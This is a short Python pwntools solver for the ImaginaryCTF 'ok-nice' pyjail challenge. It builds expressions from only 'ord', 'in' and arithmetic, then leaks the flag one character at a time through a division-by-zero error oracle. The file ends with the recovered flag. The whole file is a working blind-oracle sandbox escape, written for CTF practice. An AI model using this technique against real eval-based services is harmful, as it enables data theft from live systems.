from pwn import *
from tqdm import trange

context.log_level = "critical"


def send(command):
    # io = process(["python", "jail.py"])
    # io = process(["python", "jail.mod.py"])
    io = remote("ok-nice.chal.imaginaryctf.org", 1337)
    io.sendlineafter(b"Enter input: ", command.encode())
    res = io.recvline()
    io.close()
    return res


def num(n):
    true = "((ord)in[(ord)])"
    return "(" + "+".join([true] * n) + ")"


def check(i, c):
    """
    return flag[i] == c
    """
    res = send(f"{num(1)}/(({num(ord(c))})in[(ord(flag[{num(i)}]))])")
    return b"ok nice" in res


# ***********************************************************
# お試し
# ***********************************************************

# print(num(2))
# print(send(num(2)))
# print(send(f"flag[{num(2)}]"))
# print(send(f"[(ord(flag[{num(2)}]))]"))
# # True
# print(send(f"({num(116)})in[(ord(flag[{num(2)}]))]"))
# # 1/0 -> Error
# print(send(f"{num(1)}/(({num(116)})in[(ord(flag[{num(2)}]))])"))
# print(send(f"{num(1)}/(({num(115)})in[(ord(flag[{num(2)}]))])"))

# assert check(2, "s") == False
# assert check(2, "t") == True

flag = "ictf{"
while flag[-1] != "}":
    for c in trange(32, 128):
        if check(len(flag), chr(c)):
            flag += chr(c)
            print(flag)
            break

# ictf{0k_n1c3_7f4d3e5a6b}
